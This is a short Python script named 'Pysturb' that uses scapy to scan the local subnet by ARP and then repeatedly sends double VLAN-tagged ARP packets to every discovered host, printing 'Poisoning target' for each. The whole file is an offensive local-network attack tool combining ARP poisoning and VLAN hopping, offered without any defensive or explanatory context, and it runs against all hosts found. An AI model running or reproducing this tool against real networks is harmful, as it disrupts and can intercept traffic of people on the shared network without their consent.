import json
import inquirer
import socket
import scapy.all as scapy

# Print prettified json
def jprint(args):
    print(json.dumps(args, indent=4, sort_keys=True))

# Print pretiffied instance attributes
def pprint(args):
    jprint(vars(args))

class Pysturb:
    def __init__(self):
        self.iface_list = self.get_iface_list()

    # Display interface selection menu
    def prompt_select_iface(self):
        if not self.iface_list:
            print("No available network interface found!")
            return

        questions = [
            inquirer.List(
                "iface",
                message="Select network interface",
                choices=self.iface_list
            )
        ]
        iface = inquirer.prompt(questions)['iface']
        self.iface = iface
        self.ip_addr = scapy.get_if_addr(iface)
        self.mac_addr = scapy.get_if_hwaddr(iface)
        self.gateway = scapy.conf.route.route('0.0.0.0')[2]
        self.targets = self.scan_targets()

    # Get available interfaces
    def get_iface_list(self):
        return [i for i in scapy.get_if_list() if i != 'lo']

    def flood_scan(self):
        pass


    def scan_targets(self):
        #sementara:v
        targets = list()
        ips=self.ip_addr + '/24'
        request = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(pdst=ips)
        ans, unans = scapy.srp(request, iface=self.iface, timeout=1, verbose=0)
        for send, recv in ans:
            if recv:
                target = dict()
                target["ip_addr"] = recv[scapy.ARP].psrc
                target["mac_addr"] = recv[scapy.ARP].hwsrc
                targets.append(target)
        return targets

    def perform_arp_poison(self):
        for target in self.targets:
            print("Poisoning target with IPv4: {} and MAC: {}".format(target['ip_addr'], target['mac_addr']))
            scapy.send(scapy.Ether(dst=target['mac_addr'])
                    /scapy.Dot1Q(vlan=1)
                    /scapy.Dot1Q(vlan=2)
                    /scapy.ARP(op="who-has", 
                        psrc=self.ip_addr, 
                        pdst=target['ip_addr']), 
                        inter=scapy.RandNum(10, 40), 
                        loop=1)

worker = Pysturb()
worker.prompt_select_iface()
worker.perform_arp_poison()
print(worker.targets)

